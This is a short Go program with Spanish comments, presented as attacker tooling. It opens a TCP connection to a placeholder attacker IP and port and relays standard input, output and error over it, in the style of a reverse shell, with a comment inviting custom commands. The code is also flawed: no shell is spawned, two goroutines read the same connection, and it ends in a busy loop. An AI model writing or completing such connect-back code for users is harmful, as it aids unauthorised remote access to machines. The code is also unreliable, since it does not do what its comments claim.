package main

import (
	"fmt"
	"io"
	"net"
	"os"
)

func main() {
    // Dirección IP del atacante y puerto
    c, err := net.Dial("tcp", "tu_ip:tu_puerto")
    if err != nil {
        panic(err)
    }

    // Copiar la entrada estándar del cliente al proceso remoto
    go func() {
        _, err := io.Copy(c, os.Stdin)
        if err != nil {
            fmt.Println(err)
        }
    }()

    // Copiar la salida estándar del proceso remoto al cliente
    go func() {
        _, err := io.Copy(os.Stdout, c)
        if err != nil {
            fmt.Println(err)
        }
    }()

    // Copiar la salida de error del proceso remoto al cliente
    go func() {
        _, err := io.Copy(os.Stderr, c)
        if err != nil {
            fmt.Println(err)
        }
    }()

    // Mantener la conexión abierta
    for {
        // Puedes agregar aquí lógica adicional, como comandos personalizados
    }
}